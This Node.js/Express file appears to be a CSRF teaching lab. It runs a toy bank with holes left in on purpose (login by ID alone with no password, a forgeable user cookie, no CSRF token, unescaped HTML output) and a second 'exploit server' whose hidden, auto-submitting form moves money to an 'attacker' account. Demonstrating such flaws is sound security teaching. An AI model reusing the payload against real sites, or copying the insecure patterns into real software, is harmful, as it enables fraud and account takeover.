const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const fs = require('fs');
const path = require('path');

// Setup for the banking server
const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

const accountBalancePath = path.join(__dirname, 'account_balance.json');
let accountBalances = {};

if (fs.existsSync(accountBalancePath)) {
    accountBalances = JSON.parse(fs.readFileSync(accountBalancePath));
}

function saveBalances() {
    fs.writeFileSync(accountBalancePath, JSON.stringify(accountBalances, null, 2));
}

app.get('/', (req, res) => {
    if (req.cookies.user) {
        const user = req.cookies.user;
        const balance = accountBalances[user].balance;
        res.send(`
            <h1>Welcome, ${user}</h1>
            <p>Your balance is: $${balance}</p>
            <form action="/transfer" method="POST">
                <label for="recipient">Recipient ID:</label>
                <input type="text" id="recipient" name="recipient" required>
                <label for="amount">Amount:</label>
                <input type="number" id="amount" name="amount" required>
                <button type="submit">Transfer</button>
            </form>
            <form action="/logout" method="POST">
                <button type="submit">Logout</button>
            </form>
        `);
    } else {
        res.send(`
            <h1>Real Bank</h1>
            <form action="/login" method="POST">
                <label for="user">User ID:</label>
                <input type="text" id="user" name="user" required>
                <button type="submit">Login / Register</button>
            </form>
        `);
    }
});

app.post('/login', (req, res) => {
    const user = req.body.user;
    if (!accountBalances[user]) {
        accountBalances[user] = { balance: 10000 };
        saveBalances();
    }
    res.cookie('user', user);
    res.redirect('/');
});

app.post('/transfer', (req, res) => {
    const user = req.cookies.user;
    const recipient = req.body.recipient;
    const amount = parseFloat(req.body.amount);
    if (accountBalances[user].balance >= amount && accountBalances[recipient]) {
        accountBalances[user].balance -= amount;
        accountBalances[recipient].balance += amount;
        saveBalances();
        res.send(`Transferred $${amount} to ${recipient}.

Current balance:
${user}: $${accountBalances[user].balance}
`);
    } else {
        res.send('Transfer failed. Please check the details and try again.');
    }
});

app.post('/logout', (req, res) => {
    res.clearCookie('user');
    res.redirect('/');
});

// Setup for the exploit server
const app2 = express();
const exploitPort = 3080;

app2.get('/', (req, res) => {
    res.send(`
        <h1>Malicious Page</h1>
        Thanks for visiting. Much appreciated.  
        <form action="http://localhost:3000/transfer" method="POST" style="display:none;">
            <input type="hidden" name="recipient" value="attacker">
            <input type="hidden" name="amount" value="1000">
            <input type="submit">
        </form>
        <script>
            document.forms[0].submit();
        </script>
    `);
});

app.listen(port, () => {
    console.log(`Bank server listening at http://localhost:${port}`);
});

app2.listen(exploitPort, () => {
    console.log(`Exploit server listening at http://127.0.0.1:${exploitPort}`);
});

